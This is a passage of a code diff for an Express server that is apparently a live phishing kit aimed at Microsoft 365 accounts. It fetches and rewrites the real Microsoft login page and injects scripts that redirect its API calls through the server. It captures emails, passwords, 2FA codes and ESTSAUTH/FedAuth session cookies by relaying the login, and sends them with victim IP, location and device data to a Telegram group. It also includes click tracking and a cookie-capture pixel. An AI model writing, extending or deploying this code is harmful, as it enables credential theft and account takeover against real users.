+    await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
+  } else if (action === 'request_sms' || action === 'request_auth') {
+    const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
+    sendToSession(sessionId, 'request_2fa', codeType);
+    await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
+  } else if (action === 'done') {
+    sendToSession(sessionId, 'redirect_to_gmail');
+    await bot.sendMessage(telegramGroupId, 
+      `✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`
+    );
+    await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
   }
 });
 
-// ============= LINK TRACKING =============
-app.get('/track/click', async (req, res) => {
-  try {
-    const {
-      email = 'unknown',
-      campaign = 'unknown',
-      link = '#',
-      template = 'unknown',
-      name = 'unknown'
-    } = req.query;
-
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    
-    const agent = useragent.parse(userAgent);
-    
-    let location = 'Unknown';
-    try {
-      const geo = geoip.lookup(ip);
-      if (geo) {
-        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
-      }
-    } catch (e) {}
-
-    const clickTime = new Date().toLocaleString();
-    const token = crypto.randomBytes(4).toString('hex');
-
-    console.log(`\n🔗 LINK CLICKED [${token}]`);
-    console.log(`   Email: ${email}`);
-    console.log(`   Campaign: ${campaign}`);
-    console.log(`   Link: ${link}`);
-    console.log(`   IP: ${ip}`);
-    console.log(`   Time: ${clickTime}`);
-
-    if (bot && telegramGroupId) {
-      const message = 
-        `🔗 *Link Clicked!*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `*Email:* \`${email}\`\n` +
-        `*Name:* ${name}\n` +
-        `*Campaign:* ${campaign}\n` +
-        `*Template:* ${template}\n` +
-        `*Link:* ${link}\n` +
-        `*IP:* \`${ip}\`\n` +
-        `*Location:* ${location}\n` +
-        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
-        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
-        `*Time:* ${clickTime}\n` +
-        `*Token:* \`${token}\``;
-
-      await bot.sendMessage(telegramGroupId, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-      
-      console.log(`✅ Telegram notification sent for click ${token}`);
-    }
-
-    if (link && link !== '#') {
-      return res.redirect(302, link);
-    } else {
-      return res.send(`
-        <html>
-          <head>
-            <title>Link Tracked</title>
-            <style>
-              body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-              .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
-              h2 { color: #333; }
-              p { color: #666; }
-            </style>
-          </head>
-          <body>
-            <div class="container">
-              <h2>✅ Click Tracked</h2>
-              <p>Your click has been recorded.</p>
-              <p><small>Campaign: ${campaign}</small></p>
-            </div>
-          </body>
-        </html>
-      `);
-    }
-
-  } catch (error) {
-    console.error('❌ Error tracking click:', error);
-    
-    if (req.query.link && req.query.link !== '#') {
-      return res.redirect(302, req.query.link);
-    }
-    
-    res.status(500).send('Error tracking click');
+function sendToSession(sessionId, event, data) {
+  const session = activeSessions.get(sessionId);
+  if (!session) return false;
+  
+  for (const socketId of session.sockets) {
+    const socket = io.sockets.sockets.get(socketId);
+    if (socket?.connected) socket.emit(event, data);
   }
-});
+  return true;
+}
 
-// ============= COOKIE CAPTURE ENDPOINT =============
-app.get('/capture', async (req, res) => {
-  try {
-    const {
-      source = 'direct',
-      campaign = 'unknown',
-      email = 'unknown',
-      name = 'unknown',
-      redirect = 'https://google.com'
-    } = req.query;
-
-    const ip = requestIp.getClientIp(req);
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    
-    const agent = useragent.parse(userAgent);
-    
-    let location = 'Unknown';
-    try {
-      const geo = geoip.lookup(ip);
-      if (geo) {
-        location = `${geo.city || 'Unknown'}, ${geo.region || 'Unknown'}, ${geo.country || 'Unknown'}`;
-      }
-    } catch (e) {}
-
-    const cookies = req.cookies || {};
-    const captureTime = new Date().toLocaleString();
-    const token = crypto.randomBytes(4).toString('hex').toUpperCase();
-
-    console.log(`\n🍪 COOKIES CAPTURED [${token}]`);
-    console.log(`   Source: ${source}`);
-    console.log(`   Campaign: ${campaign}`);
-    console.log(`   Email: ${email}`);
-    console.log(`   IP: ${ip}`);
-    console.log(`   Time: ${captureTime}`);
-    console.log(`   Cookies:`, cookies);
-
-    let cookiesText = '';
-    if (Object.keys(cookies).length > 0) {
-      cookiesText = Object.entries(cookies)
-        .map(([key, value]) => `• *${key}*: \`${value}\``)
-        .join('\n');
-    } else {
-      cookiesText = 'No cookies found';
-    }
-
-    if (bot && telegramGroupId) {
-      const message = 
-        `🍪 *Cookies Captured!*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `*Token:* \`${token}\`\n` +
-        `*Source:* ${source}\n` +
-        `*Campaign:* ${campaign}\n` +
-        `*Email:* \`${email}\`\n` +
-        `*Name:* ${name}\n` +
-        `*IP:* \`${ip}\`\n` +
-        `*Location:* ${location}\n` +
-        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
-        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
-        `*Device:* ${agent.device.toString() || 'Desktop'}\n` +
-        `*Time:* ${captureTime}\n\n` +
-        `*Cookies (${Object.keys(cookies).length}):*\n${cookiesText}\n\n`;
-
-      if (message.length > 4000) {
-        await bot.sendMessage(telegramGroupId, 
-          `🍪 *Cookies Captured!*\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `*Token:* \`${token}\`\n` +
-          `*Source:* ${source}\n` +
-          `*Email:* \`${email}\`\n` +
-          `*IP:* \`${ip}\`\n` +
-          `*Location:* ${location}\n` +
-          `*Time:* ${captureTime}\n` +
-          `*Total Cookies:* ${Object.keys(cookies).length}\n\n` +
-          `_Full cookie data too large - check server logs_`,
-          { parse_mode: 'Markdown' }
-        );
-        
-        console.log(`🍪 Full cookies for ${token}:`, JSON.stringify(cookies, null, 2));
-      } else {
-        await bot.sendMessage(telegramGroupId, message, {
-          parse_mode: 'Markdown',
-          disable_web_page_preview: true
-        });
-      }
-      
-      console.log(`✅ Telegram notification sent for cookie capture ${token}`);
-    }
-
-    if (req.query.format === 'pixel') {
-      res.writeHead(200, {
-        'Content-Type': 'image/gif',
-        'Content-Length': '43',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0'
-      });
-      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
-    } else if (req.query.format === 'json') {
-      res.json({
-        success: true,
-        token: token,
-        message: 'Cookies captured successfully',
-        cookie_count: Object.keys(cookies).length,
-        redirect: redirect
-      });
-    } else {
-      const redirectUrl = new URL(redirect, 'https://google.com');
-      redirectUrl.searchParams.append('captured', token);
-      redirectUrl.searchParams.append('source', source);
-      
-      res.redirect(302, redirectUrl.toString());
-    }
-
-  } catch (error) {
-    console.error('❌ Error capturing cookies:', error);
-    
-    if (req.query.redirect && req.query.redirect !== '#') {
-      return res.redirect(302, req.query.redirect);
-    }
-    
-    res.status(500).json({ error: 'Error capturing cookies' });
-  }
-});
-
-app.post('/capture', express.urlencoded({ extended: true }), async (req, res) => {
-  try {
-    const {
-      source = 'form',
-      campaign = 'unknown',
-      email = req.body.email || 'unknown',
-      redirect = req.body.redirect || 'https://google.com'
-    } = req.query;
-
-    const cookies = req.cookies || {};
-    const formData = req.body || {};
-
-    const ip = requestIp.getClientIp(req);
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    const agent = useragent.parse(userAgent);
-    
-    let location = 'Unknown';
-    try {
-      const geo = geoip.lookup(ip);
-      if (geo) {
-        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
-      }
-    } catch (e) {}
-
-    const captureTime = new Date().toLocaleString();
-    const token = crypto.randomBytes(4).toString('hex').toUpperCase();
-
-    if (bot && telegramGroupId) {
-      const cookiesText = Object.keys(cookies).length > 0 
-        ? Object.entries(cookies).map(([k, v]) => `• *${k}*: \`${v}\``).join('\n')
-        : 'No cookies';
-      
-      const formText = Object.keys(formData).length > 0
-        ? Object.entries(formData).map(([k, v]) => `• *${k}*: \`${v}\``).join('\n')
-        : 'No form data';
-
-      const message = 
-        `📝 *Form + Cookies Captured!*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `*Token:* \`${token}\`\n` +
-        `*Source:* ${source}\n` +
-        `*Campaign:* ${campaign}\n` +
-        `*IP:* \`${ip}\`\n` +
-        `*Location:* ${location}\n` +
-        `*Time:* ${captureTime}\n\n` +
-        `*Cookies (${Object.keys(cookies).length}):*\n${cookiesText}\n\n` +
-        `*Form Data (${Object.keys(formData).length}):*\n${formText}`;
-
-      await bot.sendMessage(telegramGroupId, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-    }
-
-    res.redirect(302, redirect);
-
-  } catch (error) {
-    console.error('❌ Error in POST capture:', error);
-    res.redirect(302, req.query.redirect || 'https://google.com');
-  }
-});
-
-
-// ============= WORKING MICROSOFT PROXY =============
-// const { createProxyMiddleware } = require('http-proxy-middleware');
+// ============= MICROSOFT LOGIN PAGE FETCHER =============
 const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';
 
-// Store captured data
-const capturedData = new Map();
+app.get('/microsoft', async (req, res) => {
+  try {
+    const clientIp = requestIp.getClientIp(req) || 'unknown';
+    const now = Date.now();
+    
+    const lastRequest = requestTimestamps.get(clientIp) || 0;
+    if (now - lastRequest < SESSION_COOLDOWN) {
+      return res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
+    }
+    requestTimestamps.set(clientIp, now);
+    
+    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+    
+    const microsoftResponse = await axios({
+      method: 'GET',
+      url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
+      params: {
+        client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
+        scope: 'https://outlook.office.com/.default openid profile offline_access',
+        redirect_uri: 'https://outlook.live.com/mail/',
+        response_type: 'code',
+        response_mode: 'fragment',
+        client_info: '1',
+        prompt: 'select_account',
+        cobrandid: 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c'
+      },
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+      },
+      maxRedirects: 5,
+      timeout: 10000
+    });
 
-// Create the proxy middleware
+    let html = microsoftResponse.data;
+    
+    if (microsoftResponse.status === 302 || microsoftResponse.status === 301) {
+      const redirectResponse = await axios.get(microsoftResponse.headers.location, {
+        headers: { 'User-Agent': 'Mozilla/5.0' }
+      });
+      html = redirectResponse.data;
+    }
+
+    const $ = cheerio.load(html);
+    const params = {};
+    
+    // Add fetch/XHR interception
+    $('head').append(`
+      <script>
+        (function() {
+          const originalFetch = window.fetch;
+          window.fetch = function(url, options = {}) {
+            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+              console.log('🔄 Redirecting API call:', url);
+              return originalFetch('/proxy/GetCredentialType', options);
+            }
+            return originalFetch(url, options);
+          };
+          
+          const originalXHR = window.XMLHttpRequest;
+          window.XMLHttpRequest = function() {
+            const xhr = new originalXHR();
+            const originalOpen = xhr.open;
+            xhr.open = function(method, url, ...args) {
+              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
+                url = '/proxy/GetCredentialType';
+              }
+              return originalOpen.call(this, method, url, ...args);
+            };
+            return xhr;
+          };
+        })();
+      </script>
+    `);
+
+    // Add error handling script
+    $('body').append(`
+      <script>
+        (function() {
+          const urlParams = new URLSearchParams(window.location.search);
+          const error = urlParams.get('error');
+          const username = urlParams.get('username');
+          
+          if (error === 'invalid_password') {
+            const errorDiv = document.createElement('div');
+            errorDiv.style.cssText = 'background-color: #f8d7da; color: #721c24; padding: 12px; border-radius: 4px; margin-bottom: 20px; border: 1px solid #f5c6cb; text-align: center;';
+            errorDiv.textContent = username ? \`Incorrect password for \${username}. Please try again.\` : 'Incorrect password. Please try again.';
+            
+            const form = document.querySelector('form');
+            if (form) {
+              form.parentNode.insertBefore(errorDiv, form);
+            }
+            
+            if (username) {
+              const emailInput = document.querySelector('input[name="login"]');
+              if (emailInput) emailInput.value = username;
+            }
+          }
+          
+          sessionStorage.setItem('phishSessionId', '${sessionId}');
+        })();
+      </script>
+    `);
+
+    // Capture input fields
+    $('input').each((i, elem) => {
+      const name = $(elem).attr('name');
+      const value = $(elem).attr('value') || '';
+      if (name && value) params[name] = value;
+    });
+    
+    const defaultParams = {
+      client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
+      redirect_uri: 'https://outlook.live.com/mail/',
+      response_type: 'code',
+      scope: 'https://outlook.office.com/.default openid profile offline_access'
+    };
+    
+    Object.assign(params, defaultParams);
+    microsoftParams.set(sessionId, params);
+    
+    // Change form action to /proxy/login
+    $('form').each((i, form) => {
+      $(form).attr('action', '/proxy/login');
+      $(form).attr('method', 'POST');
+      $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
+      
+      Object.entries(defaultParams).forEach(([key, value]) => {
+        if (!$(form).find(`input[name="${key}"]`).length) {
+          $(form).append(`<input type="hidden" name="${key}" value="${value}">`);
+        }
+      });
+    });
+    
+    res.send($.html());
+    
+  } catch (error) {
+    console.error('Error fetching Microsoft page:', error.message);
+    res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
+  }
+});
+
+// ============= PROXY HANDLERS =============
+
+// Handle GetCredentialType API
+app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
+  try {
+    const response = await axios.post(
+      'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
+      req.body,
+      {
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': 'Mozilla/5.0',
+          'Origin': 'https://login.microsoftonline.com'
+        }
+      }
+    );
+    res.json(response.data);
+  } catch (error) {
+    res.json({
+      Exists: true,
+      ThrottleStatus: 0,
+      Credential: { IsSignupDisallowed: false },
+      EstsProperties: { IsSignupDisallowed: false }
+    });
+  }
+});
+
+// ============= HANDLE COMMON LOGIN ENDPOINT WITH WRONG PASSWORD REDIRECT =============
+
+// Handle POST requests to /common/login with enhanced victim info
+app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
+  console.log('📥 POST to /common/login received');
+  
+  // Get victim information
+  const victimInfo = await getVictimInfo(req);
+  
+  // Capture any credentials in the request
+  const sessionId = req.body?.sessionId || 'unknown';
+  const username = req.body?.login || req.body?.username;
+  const password = req.body?.passwd || req.body?.password;
+  
+  if (username && password) {
+    console.log(`🔑 Credentials captured from /common/login: ${username}`);
+    console.log(`   IP: ${victimInfo.ip}`);
+    console.log(`   Location: ${victimInfo.location}`);
+    
+    // Send enhanced Telegram notification with victim info
+    if (bot && telegramGroupId) {
+      const message =
+       
+        `🔑 *---(Post-Auth) Captured By Smoke---*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `*Email:* \`${username}\`\n` +
+        `*Password:* \`${password}\`\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `*Victim Information:*\n` +
+        `*IP:* \`${victimInfo.ip}\`\n` +
+        `*Location:* ${victimInfo.location}\n` +
+        `*Browser:* ${victimInfo.browser}\n` +
+        `*OS:* ${victimInfo.os}\n` +
+        `*Device:* ${victimInfo.device}\n` +
+        `*Time:* ${victimInfo.timestamp}`;
+      
+      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
+        .catch(() => {});
+    }
+    
+    const session = capturedData.get(sessionId) || {};
+    session.credentials = { 
+      username, 
+      password, 
+      time: new Date().toISOString(),
+      victimInfo 
+    };
+    capturedData.set(sessionId, session);
+  }
+  
+  // Forward the POST request to the real Microsoft login endpoint
+  try {
+    const formData = new URLSearchParams();
+    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
+    
+    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Origin': 'https://login.microsoftonline.com',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+      },
+      maxRedirects: 0,
+      validateStatus: status => status >= 200 && status < 400
+    }).catch(err => err.response);
+    
+    // Handle redirects from Microsoft
+    if (response?.headers?.location) {
+      const location = response.headers.location;
+      console.log(`↪️ Microsoft redirects to: ${location}`);
+      
+      // If it's a redirect back to login (wrong password, etc.)
+      if (location.includes('/common/login')) {
+        // Extract error information if available
+        const errorMatch = location.match(/error=([^&]+)/);
+        const error = errorMatch ? errorMatch[1] : 'invalid_password';
+        
+        console.log(`❌ Wrong password detected for: ${username}`);
+        
+        // REDIRECT BACK TO /microsoft WITH ERROR PARAMETER
+        return res.redirect(`/microsoft?error=invalid_password&username=${encodeURIComponent(username || '')}`);
+      }
+      
+      // For other redirects (successful login, etc.), follow them
+      return res.redirect(location);
+    }
+    
+    res.send(response?.data || 'OK');
+    
+  } catch (error) {
+    console.error('❌ Error forwarding to /common/login:', error.message);
+    res.redirect('/microsoft?error=connection_error');
+  }
+});
+
+// Handle GET requests to /common/login (this happens when redirected back)
+app.get('/common/login', (req, res) => {
+  console.log('🔄 GET to /common/login - redirecting to Microsoft page with error');
+  
+  // Extract error and username from query parameters
+  const error = req.query.error || 'invalid_password';
+  const username = req.query.username || '';
+  
+  // REDIRECT TO /microsoft WITH ERROR PARAMETERS
+  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
+});
+
+// Handle the proxied version
+app.post('/proxy/common/login', express.urlencoded({ extended: true }), async (req, res) => {
+  req.url = '/common/login';
+  app._router.handle(req, res);
+});
+
+app.get('/proxy/common/login', (req, res) => {
+  const error = req.query.error || 'invalid_password';
+  const username = req.query.username || '';
+  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
+});
+
+// Handle login form submissions with enhanced victim info
+app.post('/proxy/login', express.urlencoded({ extended: true }), async (req, res) => {
+  console.log('📥 Login form submission to /proxy/login');
+  
+  const sessionId = req.body?.sessionId || 'unknown';
+  const username = req.body?.login;
+  const password = req.body?.passwd;
+  
+  // Get victim information
+  const victimInfo = await getVictimInfo(req);
+  
+  if (username && password) {
+    console.log(`🔑 Password entered for: ${username}`);
+    console.log(`   IP: ${victimInfo.ip}`);
+    console.log(`   Location: ${victimInfo.location}`);
+    
+    // Send enhanced Telegram notification with victim info
+    if (bot && telegramGroupId) {
+      const message = 
+        `🔑 *Login Credentials Captured!*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `*Email:* \`${username}\`\n` +
+        `*Password:* \`${password}\`\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `*Victim Information:*\n` +
+        `*IP:* \`${victimInfo.ip}\`\n` +
+        `*Location:* ${victimInfo.location}\n` +
+        `*Browser:* ${victimInfo.browser}\n` +
+        `*OS:* ${victimInfo.os}\n` +
+        `*Device:* ${victimInfo.device}\n` +
+        `*Time:* ${victimInfo.timestamp}`;
+      
+      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
+        .catch(() => {});
+    }
+    
+    const session = capturedData.get(sessionId) || {};
+    session.credentials = { 
+      username, 
+      password, 
+      time: new Date().toISOString(),
+      victimInfo 
+    };
+    capturedData.set(sessionId, session);
+  }
+  
+  // Forward to Microsoft's /common/login endpoint
+  try {
+    const formData = new URLSearchParams();
+    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
+    
+    const response = await axios({
+      method: 'POST',
+      url: 'https://login.microsoftonline.com/common/login',
+      data: formData.toString(),
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Origin': 'https://login.microsoftonline.com',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+      },
+      maxRedirects: 0,
+      validateStatus: status => status >= 200 && status < 400
+    }).catch(err => err.response);
+    
+    if (response?.headers?.location) {
+      const location = response.headers.location;
+      console.log(`↪️ Microsoft redirects to: ${location}`);
+      
+      // Handle different redirect scenarios
+      if (location.includes('/common/login')) {
+        // This is a redirect back to login (wrong password, etc.)
+        const errorMatch = location.match(/error=([^&]+)/);
+        const error = errorMatch ? errorMatch[1] : 'invalid_password';
+        
+        console.log(`❌ Wrong password detected - redirecting back to /microsoft`);
+        
+        // REDIRECT BACK TO /common/login WHICH WILL THEN REDIRECT TO /microsoft
+        return res.redirect(`/common/login?error=${error}&username=${encodeURIComponent(username || '')}`);
+      }
+      
+      // For successful login or other redirects
+      return res.redirect(location);
+    }
+    
+    res.send(response?.data || 'OK');
+    
+  } catch (error) {
+    console.error('❌ Login proxy error:', error.message);
+    res.redirect('/common/login?error=connection_error');
+  }
+});
+
+// ============= ENHANCED PROXY MIDDLEWARE WITH COMPREHENSIVE COOKIE CAPTURE =============
 const microsoftProxy = createProxyMiddleware({
   target: MICROSOFT_LOGIN_URL,
   changeOrigin: true,
   secure: true,
   followRedirects: true,
   selfHandleResponse: true,
-  logLevel: 'debug',
-  
+  logLevel: 'silent',
   on: {
     proxyReq: (proxyReq, req, res) => {
       const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
-      console.log(`\n🔄 [${sessionId}] PROXY REQUEST:`);
-      console.log(`   Method: ${req.method}`);
-      console.log(`   URL: ${req.url}`);
-      console.log(`   Target: ${MICROSOFT_LOGIN_URL}${req.url}`);
-      
-      // Set proper headers
       proxyReq.setHeader('Host', 'login.microsoftonline.com');
-      proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
       
-      // Capture credentials from POST
-      if (req.method === 'POST' && req.body) {
-        console.log(`   📦 POST Data:`, req.body);
-        
-        const session = capturedData.get(sessionId) || {
-          id: sessionId,
-          startTime: Date.now(),
-          credentials: {},
-          cookies: []
+      if (req.method === 'POST' && req.body?.login && req.body?.passwd) {
+        const session = capturedData.get(sessionId) || {};
+        session.credentials = {
+          username: req.body.login,
+          password: req.body.passwd,
+          time: new Date().toISOString()
         };
-        
-        if (req.body.login) {
-          session.credentials.username = req.body.login;
-          console.log(`   📧 Username:`, req.body.login);
-        }
-        if (req.body.passwd) {
-          session.credentials.password = req.body.passwd;
-          console.log(`   🔑 Password:`, req.body.passwd);
-        }
-        
         capturedData.set(sessionId, session);
-        
-        // Send Telegram alert
-        if (req.body.login && req.body.passwd && bot && telegramGroupId) {
-          bot.sendMessage(telegramGroupId, 
-            `🔑 *Credentials Captured!*\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `*Session:* \`${sessionId}\`\n` +
-            `*Email:* \`${req.body.login}\`\n` +
-            `*Password:* \`${req.body.passwd}\`\n` +
-            `*Time:* ${new Date().toLocaleString()}`,
-            { parse_mode: 'Markdown' }
-          ).catch(e => console.log('Telegram error:', e.message));
-        }
       }
     },
     
-    proxyRes: (proxyRes, req, res) => {
+    proxyRes: async (proxyRes, req, res) => {
       const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
-      console.log(`\n📥 [${sessionId}] PROXY RESPONSE: ${proxyRes.statusCode}`);
-      
-      // Capture cookies
       const cookies = proxyRes.headers['set-cookie'];
+      
       if (cookies) {
-        console.log(`   🍪 Cookies (${cookies.length}):`);
-        cookies.forEach((cookie, i) => {
-          console.log(`      ${i+1}. ${cookie.substring(0, 100)}`);
-          
-          if (cookie.includes('ESTSAUTH') || cookie.includes('MSISAuth')) {
-            console.log(`      🔥 CRITICAL SESSION COOKIE!`);
-            
-            const session = capturedData.get(sessionId) || { cookies: [] };
-            if (!session.cookies) session.cookies = [];
-            session.cookies.push(cookie);
-            capturedData.set(sessionId, session);
-            
-            // Send cookie alert
-            if (bot && telegramGroupId) {
-              bot.sendMessage(telegramGroupId,
-                `🍪 *SESSION COOKIE CAPTURED!*\n` +
-                `━━━━━━━━━━━━━━━━━━\n` +
-                `*Session:* \`${sessionId}\`\n` +
-                `*Cookie:* \`${cookie.substring(0, 100)}...\`\n` +
-                `*Time:* ${new Date().toLocaleString()}`,
-                { parse_mode: 'Markdown' }
-              ).catch(e => console.log('Telegram error:', e.message));
+        const session = capturedData.get(sessionId) || { cookies: [] };
+        session.cookies = [...(session.cookies || []), ...cookies];
+        
+        // Define all Microsoft session cookies to look for
+        const criticalCookiePatterns = [
+          { name: 'FedAuth', description: 'Primary authentication cookie' },
+          { name: 'x-ms-gateway-token', description: 'Gateway session token' },
+          { name: 'ESTSAUTH', description: 'Microsoft account auth' },
+          { name: 'ESTSAUTHPERSISTENT', description: 'Persistent login' },
+          { name: 'MSISAuth', description: 'Legacy auth' },
+          { name: 'SignInStateCookie', description: 'Sign-in state' }
+        ];
+        
+        // Track captured cookies
+        const capturedCookies = [];
+        
+        cookies.forEach(cookie => {
+          criticalCookiePatterns.forEach(pattern => {
+            if (cookie.includes(pattern.name)) {
+              capturedCookies.push({
+                pattern: pattern.name,
+                description: pattern.description,
+                fullCookie: cookie
+              });
+              console.log(`🔥 ${pattern.name} (${pattern.description}) captured for session: ${sessionId}`);
             }
-          }
+          });
         });
+        
+        // Send comprehensive Telegram notification if any critical cookies were captured
+        if (capturedCookies.length > 0 && bot && telegramGroupId) {
+          const victimInfo = await getVictimInfo(req);
+          
+          // Format the cookie summary
+          const cookieSummary = capturedCookies.map(c => 
+            `• *${c.pattern}*: ${c.description}`
+          ).join('\n');
+          
+          // Get the full cookie values (truncated for readability)
+          const fullCookieValues = capturedCookies.map(c => {
+            const match = c.fullCookie.match(new RegExp(`${c.pattern}=([^;]+)`));
+            const value = match ? match[1] : 'unknown';
+            return `• ${c.pattern}: \`${value.substring(0, 30)}${value.length > 30 ? '...' : ''}\``;
+          }).join('\n');
+          
+          const message = 
+            `🍪 *Microsoft 365 Session Cookies Captured!*\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `*Session:* \`${sessionId}\`\n` +
+            `*Cookies captured (${capturedCookies.length}):*\n${cookieSummary}\n\n` +
+            `*Cookie Values:*\n${fullCookieValues}\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `*Victim Information:*\n` +
+            `*IP:* \`${victimInfo.ip}\`\n` +
+            `*Location:* ${victimInfo.location}\n` +
+            `*Browser:* ${victimInfo.browser}\n` +
+            `*OS:* ${victimInfo.os}\n` +
+            `*Device:* ${victimInfo.device}\n` +
+            `*Time:* ${victimInfo.timestamp}`;
+          
+          bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
+            .catch(() => {});
+        }
+        
+        capturedData.set(sessionId, session);
       }
       
-      // Forward response
       let body = [];
       proxyRes.on('data', chunk => body.push(chunk));
       proxyRes.on('end', () => {
@@ -1266,233 +762,121 @@ const microsoftProxy = createProxyMiddleware({
     },
     
     error: (err, req, res) => {
-      console.error('❌ Proxy Error:', err.message);
-      res.writeHead(500, { 'Content-Type': 'text/html' });
-      res.end(`
-        <html>
-          <head><title>Error</title></head>
-          <body>
-            <h2>Connection Error</h2>
-            <p>Unable to connect to Microsoft. Please try again.</p>
-            <p><small>${err.message}</small></p>
-            <a href="/microsoft">Go Back</a>
-          </body>
-        </html>
-      `);
+      console.error('Proxy error:', err.message);
+      // Enhanced error handling for ECONNRESET
+      if (err.code === 'ECONNRESET') {
+        return res.redirect('/microsoft?error=connection_reset');
+      }
+      res.redirect(`https://login.microsoftonline.com${req.url}`);
     }
   }
 });
 
-// IMPORTANT: This MUST be before express.json() and express.urlencoded()
-// Move these BEFORE your other middleware if needed
-app.use('/proxy', express.urlencoded({ extended: true }));
-app.use('/proxy', express.json());
-
-// Mount the proxy
+// Mount proxy middleware
 app.use('/proxy', (req, res, next) => {
-  console.log(`\n🎯 PROXY ROUTE: ${req.method} ${req.url}`);
-  console.log('   Query:', req.query);
-  console.log('   Body:', req.body);
+  const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
+  const msParams = microsoftParams.get(sessionId) || {};
   
-  // Ensure session ID is in query
-  if (req.body?.sessionId && !req.query.sessionId) {
-    req.query.sessionId = req.body.sessionId;
+  if (req.method === 'POST') {
+    req.body = { ...msParams, ...req.body };
+    Object.assign(req.body, {
+      client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
+      redirect_uri: 'https://outlook.live.com/mail/',
+      response_type: 'code',
+      scope: 'https://outlook.office.com/.default openid profile offline_access'
+    });
   }
   
   microsoftProxy(req, res, next);
 });
 
-// Add test endpoint
-app.get('/proxy-test', (req, res) => {
-  res.json({
-    status: 'Proxy is mounted',
-    target: MICROSOFT_LOGIN_URL,
-    sessions: capturedData.size,
-    routes: app._router.stack
-      .filter(r => r.route)
-      .map(r => r.route.path)
-  });
-});
-
-app.get('/test-microsoft', async (req, res) => {
-  try {
-    const response = await fetch('https://login.microsoftonline.com/common/discovery/instance');
-    const data = await response.text();
-    res.json({ success: true, data: data.substring(0, 200) });
-  } catch (error) {
-    res.json({ success: false, error: error.message });
+// ============= CAPTURE ENDPOINTS =============
+app.get('/capture', async (req, res) => {
+  const { email = 'unknown', redirect = 'https://google.com' } = req.query;
+  const cookies = req.cookies || {};
+  
+  if (bot && telegramGroupId && Object.keys(cookies).length > 0) {
+    const victimInfo = await getVictimInfo(req);
+    const cookiesText = Object.entries(cookies).map(([k, v]) => `• ${k}: ${v}`).join('\n');
+    
+    const message = 
+      `🍪 *Cookies Captured*\n` +
+      `━━━━━━━━━━━━━━━━━━\n` +
+      `*Email:* ${email}\n` +
